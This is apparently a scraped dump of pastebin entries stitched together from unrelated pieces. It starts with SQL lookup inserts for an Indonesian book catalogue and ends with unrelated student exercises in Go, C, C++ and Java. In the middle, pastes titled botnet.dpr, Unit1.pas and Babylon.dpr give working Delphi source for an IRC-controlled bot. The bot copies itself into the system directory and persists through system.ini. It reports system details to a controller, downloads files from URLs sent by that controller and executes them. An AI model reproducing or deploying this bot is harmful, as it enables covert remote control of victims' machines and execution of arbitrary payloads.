	 ('40f8a106-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi 1',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a124-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi 2',4,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a138-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi 3',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a14c-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi 4',6,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a160-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi 5',7,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a174-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-1',8,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a17e-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-2',9,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a192-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-3',10,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a1a6-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-4',11,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('40f8a1ba-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-5',12,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a1ce-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-6',13,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a1e2-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-7',14,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a1f6-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-8',15,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a20a-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-9',16,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('40f8a21e-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Edisi Ke-10',17,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('acb7b5ad-2cd1-4614-8542-6f8157835eb2'::uuid,'BOOK-EDITION','Tidak Tersedia',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('bc293850-53c0-11ea-b6cc-87ba0e195354'::uuid,'CATALOG_RESULT','Fiksi',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('cbf5de64-53c0-11ea-b6cc-87ba0e195354'::uuid,'CATALOG_RESULT','Non Fiksi',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('d7e37998-53c0-11ea-b6cc-87ba0e195354'::uuid,'CATALOG_RESULT','Terjemahan',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('0c5229d5-7f8c-4c91-b41b-a90407426c17'::uuid,'CATALOG_RESULT','Tidak diketahui',4,NULL,'2020-05-13 10:41:51.163','2020-05-13 10:41:51.163'),
	 ('06f67266-68eb-4eed-9706-898a5ee7ec77'::uuid,'CATALOG_RESULT','Novel',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('cd788c47-6cb7-4010-a072-c38cc2154574'::uuid,'CATALOG_RESULT','Cerita pendek',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('c22a6e69-e5a1-4cf8-a668-71fd88ea51a0'::uuid,'CATALOG_RESULT','Esai',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('b0c89252-0169-4652-8376-61c67be54c8a'::uuid,'CATALOG_RESULT','Puisi',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('64d55d78-50a6-4b44-a3ef-2f8707b44090'::uuid,'CATALOG_RESULT','Bentuk Campuran',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('96dcd819-5eda-4cf3-b51f-d95a1ac696c5'::uuid,'CATALOG_RESULT','Drama',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('f0e18bf0-5fb9-4246-aa4b-ee304889b13f'::uuid,'CATALOG_RESULT','Karya humor, satir, atau bentuk sastra serupa',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('5918a5d1-d501-437e-a65f-c69443cb28b6'::uuid,'CATALOG_RESULT','Pidato',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('bc066a72-fc6d-47ec-bee4-0d82f3bbfe11'::uuid,'CATALOG_RESULT','Surat atau kumpulan surat',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('b76fe20a-6720-11ea-a3f7-2e840ba41c9c'::uuid,'CATALOG_SELECTION','TEAM',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('bdc595b4-6720-11ea-a3f7-2e840ba41c9c'::uuid,'CATALOG_SELECTION','DINAS',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('c28e618e-6720-11ea-a3f7-2e840ba41c9c'::uuid,'CATALOG_SELECTION','APPROVED',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('4c1c374b-b74c-4a99-9b6c-53896d717fe6'::uuid,'CATALOG_SELECTION','APPROVED BY PUBLISER',4,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('b76fe20a-6720-11ea-a3f7-2e840aa41c9c'::uuid,'FILETYPE','PDF',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('bdc595b4-6720-11ea-a3f7-2e840aa41c9c'::uuid,'FILETYPE','EPUB',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('c28e618e-6720-11ea-a3f7-2e840aa41c9c'::uuid,'FILETYPE','MOBI',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('4aab0470-0ffc-43be-801a-ebee073dfc8d'::uuid,'LANGUAGE','Indonesia',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('a5b0d6b6-7a53-4932-bb0e-b6c8a84fee68'::uuid,'LANGUAGE','Inggris',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('cf0b4e27-fc4d-45fd-b542-dd2e56d19381'::uuid,'LANGUAGE','Prancis',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('905e5f0a-8104-4b46-9d74-ade60f0f2d52'::uuid,'LANGUAGE','Jerman',4,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('a92d4dfc-fe12-41af-a2cd-5bd4761de338'::uuid,'LANGUAGE','Belum Diketahui',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('b70d73bd-851b-4096-90f3-3c9272228e7a'::uuid,'NEWS_CATEGORY','Umum',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('da49f4c8-fe4c-4b1c-ae49-fcaaf26a9964'::uuid,'NEWS_CATEGORY','Internal',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('3794ec45-7c69-486d-889f-044de0a8b517'::uuid,'NEWS_CATEGORY','Kebijakan',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('98eed67e-5da4-11ea-9b44-a2eedb660190'::uuid,'ORG-TYPE','Penyedia',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('9f326b45-5da4-11ea-9b44-a2eedb660190'::uuid,'ORG-TYPE','Konsumen',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('c47f0abd-8026-47ea-b5ce-c56a4071ff8b'::uuid,'SOURCE-OF-PRODUCT','Lokal',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('fc361a53-6be5-49be-ae67-3c5a027a89c0'::uuid,'SOURCE-OF-PRODUCT','Import',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('753208d7-c722-4d56-a528-6c630b70bafc'::uuid,'SOURCE-OF-PRODUCT','Belum Diketahui',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('ee117b7e-5c59-11ea-b606-8266772247fd'::uuid,'TEAM-DINAS','Project Manager',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('f75d8e84-5c59-11ea-b606-8266772247fd'::uuid,'TEAM-DINAS','Pustakawan',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fc904e-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 1',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fc92e2-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 2',3,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fc930a-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 3',4,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc564-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 4',5,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc6d6-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 5',6,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc712-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 6',7,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc73a-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 7',8,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc762-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 8',9,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('45fcc78a-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 9',10,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc7a8-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 10',11,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc7da-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 11',12,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc802-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 12',13,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc820-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 13',14,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc848-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 14',15,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc870-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 15',16,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc898-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 16',17,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcc8c0-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 17',18,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcee5e-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 18',19,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');
INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('45fcef3a-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 19',20,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('45fcef6c-53c7-11ea-b6cc-87ba0e195354'::uuid,'VOLUME','Jilid 20',21,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
	 ('eecffce9-e815-4074-9810-34f99c8c63d3'::uuid,'VOLUME','Tidak Tersedia',1,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004');"
ayvBdj9B,botnet.dpr,FlyFar,Delphi,Wednesday 7th of June 2023 04:15:35 AM CDT,"   program botnet;

   uses
     Forms,
     Unit1 in 'Unit1.pas' {Form1},
     Unit2 in 'Unit2.pas' {Form2};

   {$R *.res}

   begin
     Application.Initialize;
     Application.CreateForm(TForm1, Form1);
     Application.CreateForm(TForm2, Form2);
     Application.Run;
   end."
4uMEB7t6,Unit1.pas,FlyFar,Pascal,Wednesday 7th of June 2023 04:14:42 AM CDT,"   unit Unit1;

   interface

   Uses
     Windows, Winsock, WinInet, ShellApi;

   Var
     Params        :Array[0..500]Of String;
     Procedure Install(Filename, Mutex       :String);
     Procedure StartBot(IP:String; Port:Integer);
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   //----------- START OF USELESS FUNCTIONS

   Procedure ExecuteFile(F: String; Show:Boolean);
   Begin
     ShellExecute(0,'open',pChar(F),0,0,Integer(Show));
   End;

   Function SysDir: String;
   Var
     sD    :Array[0..256] Of Char;
   Begin
     GetSystemDirectory(@sD, SizeOf(sD));
     Result := String(sD)+'\';
   End;

   Procedure Install(Filename, Mutex       :String);
   Begin
     CopyFile(pChar(Paramstr(0)), pChar(SysDir+Filename), False);
     If CreateMutex(NIL, FALSE, pChar(Mutex)) = ERROR_ALREADY_EXISTS Then ExitProcess(0);
     WritePrivateProfileString('boot','shell',pChar('Explorer.exe '+Filename),'system.ini');
   End;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   Function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function iGetNick(Param:String):String;
   Begin
    Result := Copy(Param, 2, Pos('!', Param)-2);
   End;

   Function iGetIdent(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos('@', Param)-2);
   End;

   Function iGetHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('@', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetFullHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetChannel(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, 1, Pos(':', result)-2);
   End;

   Function iGetMessage(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, Pos(':', result)+1, Length(Result));
    If Copy(Result, Length(Result)-1, 2) = #13#10 Then
      Result := Copy(Result, 1, Length(Result)-2);
   End;

   Function GetNet:String;
   Var
    S:Dword;
   Begin
    S := INTERNET_CONNECTION_LAN;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
      Result := 'LAN';
    S := INTERNET_CONNECTION_MODEM;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
      Result := 'Dial-up';
   End;

   function GetOS: string;
   const
     cOsUnknown  = 'woot?';
     cOsWin95    = 'Win95';
     cOsWin98    = 'Win98';
     cOsWin98SE  = 'W98SE';
     cOsWinME    = 'WinME';
     cOsWinNT    = 'WinNT';
     cOsWin2000  = 'Win2k';
     cOsXP       = 'WinXP';
   var
     osVerInfo: TOSVersionInfo;
     majorVer, minorVer: Integer;
   begin
     Result := cOsUnknown;
     { set operating system type flag }
     osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
     if GetVersionEx(osVerInfo) then
     begin
       majorVer := osVerInfo.dwMajorVersion;
       minorVer := osVerInfo.dwMinorVersion;
       case osVerInfo.dwPlatformId of
         VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
           begin
             if majorVer <= 4 then
               Result := cOsWinNT
             else if (majorVer = 5) and (minorVer = 0) then
               Result := cOsWin2000
             else if (majorVer = 5) and (minorVer = 1) then
               Result := cOsXP
             else
               Result := cOsUnknown;
           end;
         VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
           begin
             if (majorVer = 4) and (minorVer = 0) then
               Result := cOsWin95
             else if (majorVer = 4) and (minorVer = 10) then
             begin
               if osVerInfo.szCSDVersion[1] = 'A' then
                 Result := cOsWin98SE
               else
                 Result := cOsWin98;
             end
             else if (majorVer = 4) and (minorVer = 90) then
               Result := cOsWinME
             else
               Result := cOsUnknown;
           end;
         else
           Result := cOsUnknown;
       end;
     end
     else
       Result := cOsUnknown;
   end;

   Function RandomNick:String;
   Var
     I: Integer;
   Begin
     Randomize;
     Result := '';
     For I:=0 To 20 Do
       Result := Result + Chr( Random(26)+97 );
   End;

   Procedure GetParams(S: String);
   Var
     Tmp         :String;
     I           :Integer;
   Begin
     S := S + ' ';
     I := 0;

     While Pos(' ', S) > 0 Do
     Begin
       If I = 10 Then Break;
       Tmp := Copy(S, 1, Pos(' ', S)-1);
       S   := Copy(S, Pos(' ', S)+1, Length(S));
       If Tmp <> '' Then
       Begin
         Params[i] := Tmp;
         Inc(I);
       End;
     End;
   End;

   //----------- END OF USELESS FUNCTIONS

   Procedure ReadSock(Sock: TSocket);
   Var
     tmpRecv  :Array[0..26000] Of Char;
     tmpData  :String;
   Label
     Abort;
   Begin

     tmpData := 'USER '+RandomNick+' '+RandomNick+'@mail.com '+RandomNick+' '+RandomNick+#13#10;
     tmpData := tmpData + 'NICK '+RandomNick+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);
     tmpData := 'CONNECTION '+getNet+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);
     tmpData := 'OSTYPE '+GetOS+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);

     While Recv(Sock, tmpRecv, SizeOf(tmpRecv), 0) > 0 Do
     Begin

       ZeroMemory(@tmpData, SizeOf(tmpData));
       tmpData := tmpRecv;
       ZeroMemory(@tmpRecv, SizeOf(tmpRecv));

       GetParams(iGetMessage(tmpData));

       If LowerCase(Params[0]) = '.exit' Then
         ExitProcess(0);
       If LowerCase(Params[0]) = '.restart' Then
       Begin
         If Params[1] = '' Then Params[1] := '60';
         CloseSocket(Sock);
         Sleep(1000*StrToInt(Params[1]));

       End;
       If LowerCase(Params[0]) = '.download' Then
       Begin
         If Params[1] = '' Then Goto Abort;
         If Params[2] = '' Then Goto Abort;
         If Params[3] = '' Then Goto Abort;

         tmpData := 'PRIVMSG #Admin :Download '+Params[1]+#13#10;
         Send(Sock, tmpData[1], Length(tmpData), 0);
         Sleep(200);

         URLDownloadToFile(0, pChar(Params[1]), pChar(Params[2]), 0, 0);

         tmpData := 'PRIVMSG #Admin :Downloaded '+Params[1]+#13#10;
         Send(Sock, tmpData[1], Length(tmpData), 0);
         Sleep(200);

         If Params[3] = '1' Then
         Begin
           If Params[4] = '' Then Params[4] := '1';
           ExeCuteFile(Params[2], Boolean(StrToInt(Params[4])));
           tmpData := 'PRIVMSG #Admin :Executed '+Params[2]+#13#10;
           Send(Sock, tmpData[1], Length(tmpData), 0);
           Sleep(200);
         End;

         If Params[5] = 'exit' Then ExitProcess(0);
         If Params[5] = 'reboot' Then Begin
           CloseSocket(Sock);
           Sleep(1000*60);
         End;
       End;

   Abort:
     End;

   End;

   Procedure StartBot(IP:String; Port:Integer);
   Var
     Sock: TSocket;
     SockA: TSockAddrIn;
     SockWSA: TWSAData;
   Begin

     IP := IPStr(IP);
     Repeat
       WSAStartUp(MakeWord(2,1),SockWSA);
       Sock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
       SockA.sin_family := AF_INET;
       SockA.sin_port := hTons(Port);
       SockA.sin_addr.S_addr := Inet_Addr(pChar(IP));
       If Connect(Sock, SockA, SizeOf(SockA)) > -1 Then
       Begin
         ReadSock(Sock);
       End;
       WSACleanUp();
     Until 1=2;

   End;

   end."
4g0Ct19S,Babylon.dpr,FlyFar,Delphi,Wednesday 7th of June 2023 04:14:06 AM CDT,"   program Babylon;

   uses
     Windows,
     Unit1 in 'Unit1.pas';

   begin
     Sleep(5000);
     Install('Flaw.exe', 'Flaw-Version-1.0');
     StartBot('127.0.0.1', 6667);
   end."
TLpRYUrk,Untitled,MatrixDeity,Go,Wednesday 7th of June 2023 04:13:44 AM CDT,"package main

import (
	""context""
	""fmt""
	""sync""
	""time""
)

const (
	defaultCleanupInterval time.Duration = time.Second
)

type Cache struct {
	data            map[string]Item
	ttl             time.Duration
	cleanupInterval time.Duration
	ctx             context.Context
	lock            sync.RWMutex
}

type Item struct {
	Value      any
	Expiration int64
}

func NewCache(ctx context.Context, ttl time.Duration) (*Cache, error) {
	if ttl <= 0 {
		return nil, fmt.Errorf(""bad ttl: %d"", ttl)
	}

	cache := &Cache{
		data:            make(map[string]Item),
		ttl:             ttl,
		cleanupInterval: defaultCleanupInterval,
		ctx:             ctx,
	}
	cache.runGC()

	return cache, nil
}

func (c *Cache) Len() int {
	c.lock.RLock()
	defer c.lock.RUnlock()

	return len(c.data)
}

func (c *Cache) Set(key string, value any) {
	item := Item{
		Value:      value,
		Expiration: time.Now().Add(c.ttl).UnixNano(),
	}

	c.lock.Lock()
	c.data[key] = item
	c.lock.Unlock()
}

func (c *Cache) Get(key string) (any, bool) {
	now := time.Now().UnixNano()

	c.lock.RLock()
	item, ok := c.data[key]
	c.lock.RUnlock()

	if !ok || item.Expiration < now {
		return nil, false
	}
	return item.Value, true
}

func (c *Cache) Delete(key string) {
	c.bulkRemove(key)
}

func (c *Cache) runGC() {
	go func() {
		for {
			select {
			case <-time.After(c.cleanupInterval):
				go func() {
					keys := c.collectExpiredKeys()
					c.bulkRemove(keys...)
				}()
			case <-c.ctx.Done():
				return
			}
		}
	}()
}

func (c *Cache) collectExpiredKeys() []string {
	now := time.Now().UnixNano()

	c.lock.RLock()
	defer c.lock.RUnlock()

	res := make([]string, 0, len(c.data))
	for key, item := range c.data {
		if item.Expiration < now {
			res = append(res, key)
		}
	}

	return res
}

func (c *Cache) bulkRemove(keys ...string) {
	c.lock.Lock()
	defer c.lock.Unlock()

	for _, key := range keys {
		delete(c.data, key)
	}
}
"
86bQdW1E,Untitled,deezykiki,C++,Wednesday 7th of June 2023 04:05:37 AM CDT,"第一题
#include <stdio.h>

int main() {
    char letter;
    int count = 0;
    char string[10];

    printf(""Enter 5 letters:\n"");

    while (count < 5) {
        scanf("" %c"", &letter);
        string[count] = letter;
        count++;
    }

    string[count] = '\0';

    for (int i = 0; i < count; i++) {
        if(i<count-1)
        printf(""%c*"", string[i]);
        else printf(""%c"", string[i]);
    }

    return 0;
}

第二题
#include <stdio.h>
#include <math.h>

int main() {
    int choice;
    float x, y, z;

    while (1) {
        printf(""Press 1 to Input x (float number), and calculate y value based on the function y=x^2\n"");
        printf(""Press 2 to Input x and y two float numbers, and calculate z value based on the function z=(x+y)^2\n"");
        printf(""Press 0 to EXIT\n"");
        printf(""Enter your choice: "");
        scanf(""%d"", &choice);

        switch (choice) {
            case 1:
                printf(""Enter x: "");
                scanf(""%f"", &x);
                y = pow(x, 2);
                printf(""y = %.2f\n"", y);
                break;
            case 2:
                printf(""Enter x: "");
                scanf(""%f"", &x);
                printf(""Enter y: "");
                scanf(""%f"", &y);
                z = pow((x + y), 2);
                printf(""z = %.2f\n"", z);
                break;
            case 0:
                printf(""Exiting program...\n"");
                return 0;
            default:
                printf(""Invalid choice. Please try again.\n"");
        }
    }
}
"
AfPW69cs,dem21.n2,Korotkodul,C++,Wednesday 7th of June 2023 03:58:32 AM CDT,"/******************************************************************************

                              Online C++ Compiler.
               Code, Compile, Run and Debug C++ program online.
Write your code in this editor and press ""Run"" button to compile and execute it.

*******************************************************************************/

#include <iostream>
#include <vector>
using namespace std;

bool f(bool x, bool y, bool z, bool w) {
    bool A = x || y;
    bool B = (y != z);
    //bool B = !(y == z)
    bool C = !w;
    return A && B && C;
}

int main()
{
    vector <bool> v = {0,1};
    for (bool x: v) {
        for (bool y: v) {
            for (bool z: v) {
                for (bool w: v) {
                    bool F = f(x,y,z,w);
                    if (F) {
                        cout << x << ' ' << y << ' ' << z << ' ' << w << ""\n"";
                    }
                }
            }
        }
    }
}
"
yrGbu5Lx,dem22.n2,Korotkodul,C++,Wednesday 7th of June 2023 03:49:22 AM CDT,"/******************************************************************************

                              Online C++ Compiler.
               Code, Compile, Run and Debug C++ program online.
Write your code in this editor and press ""Run"" button to compile and execute it.

*******************************************************************************/

#include <iostream>
#include <vector>
using namespace std;

bool imp(bool a, bool b) {
    return !a || b;
}

bool f(bool x, bool y, bool z, bool w) {
    bool A = (x == w);
    A = imp(y, A);
    A = !A;
    bool B = imp(z,x);
    return A && B;
}

int main()
{
    vector <bool> v = {0,1};
    for (bool x: v) {
        for (bool y: v) {
            for (bool z: v) {
                for (bool w: v) {
                    bool F = f(x,y,z,w);
                    if (F) {
                        cout << x << ' ' << y << ' ' << z << ' ' << w << ""\n"";
                    }
                }
                
            }
        }
    }
}
"
DhUncMm6,Quieta- Activity 7 Java. Finding the Largest and Smallest value from user input,JcGaming,Java,Wednesday 7th of June 2023 03:44:55 AM CDT,"/**
 * Quieta, John Carl
 * CCS-1D
 */

import java.util.Scanner;

public class main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int[] cat = new int[10];


        for (int i = 0; i < cat.length; i++) {
            System.out.print(""Enter the value of ["" + i + ""]: "");
            cat[i] = scanner.nextInt();
        }

        int small = cat[0];
        int large = cat[0];
        for (int i = 1; i < cat.length; i++) {
            if (cat[i] < small) {
                small = cat[i];
            }
            if (cat[i] > large) {
                large = cat[i];
            }
        }

        System.out.println(""Largest is "" + large + "" and smallest is "" + small);
    }
}
"
zfKd05mj,Untitled,35657,C++,Wednesday 7th of June 2023 03:37:34 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string.h>

